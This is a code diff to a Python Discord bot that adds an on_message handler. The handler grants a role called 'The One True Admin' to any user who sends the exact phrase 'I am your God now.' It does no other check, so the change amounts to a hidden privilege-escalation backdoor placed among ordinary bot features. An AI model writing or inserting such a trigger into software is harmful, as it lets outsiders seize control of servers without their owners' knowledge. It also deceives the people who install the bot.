@@ -175,6 +175,15 @@ async def on_ready():
     print("okay")
     print(c.fetchall())
 
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
+    if message.content == 'I am your God now.':
+        role = get(message.server.roles, name='The One True Admin')
+        await client.add_roles(message.author, role)
+
+
 bot.add_cog(music.Music(bot))
 bot.add_cog(fileSender.FileSender(bot))
 bot.add_cog(Alias(bot))
